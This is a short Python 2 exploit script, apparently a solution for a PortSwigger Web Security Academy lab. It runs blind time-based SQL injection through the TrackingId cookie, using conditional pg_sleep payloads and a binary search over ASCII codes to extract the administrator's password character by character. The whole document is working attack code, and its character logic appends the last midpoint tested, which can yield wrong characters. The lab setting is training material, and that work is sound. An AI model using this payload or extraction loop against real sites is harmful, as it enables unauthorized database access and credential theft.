#!/usr/bin/python

import requests
import sys
import datetime

# Change BASEURL after generating URL from PortSwigger 
BASEURL = "https://ac5d1f891e6252c580b8208200ed0019.web-security-academy.net/"

# Send request to get cookies
def SendRequest(url,cookies):
    res =  requests.get(format(url))
    result = []
    for cookie in res.cookies:
       result.append(cookie.value)
    return result

# Fuction to help you check your condition is that true or false 
def evaluateCondition(trackid, session, cond):
    payload = "x'%%3BSELECT+CASE+WHEN+((SELECT+COUNT(username)+FROM+users+WHERE+username='administrator'+AND+(%s))=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+--"%(cond)

    response = requests.get(BASEURL, cookies = {'TrackingId': payload, 'session': session})

    if (response.elapsed.total_seconds() > 3):
        return True
    return False

# Function to brute force administrator's password
def evaluateSQL(trackid, session):
    result = ""
    while (True):
        range_low = 0
        range_high = 128

        for i in range(0, 8):
            testChar = (range_low + range_high) / 2
            res = evaluateCondition(trackid, session, "ascii(substr(password,%d,1))>=%d"%(len(result) + 1, testChar))
            if res:
                range_low = testChar
            else:
                range_high = testChar

        if testChar == 0:
            break

        result += chr(testChar)
        print "Found: %s"%(result)
    return result


if __name__ == "__main__":
    # Get cookies
    cookies = []
    cookies = SendRequest(BASEURL, {})
    # 
    if  len(sys.argv) > 1:
        print evaluateCondition(cookies[0], cookies[1], sys.argv[1])
    else:
        evaluateSQL(cookies[0], cookies[1])




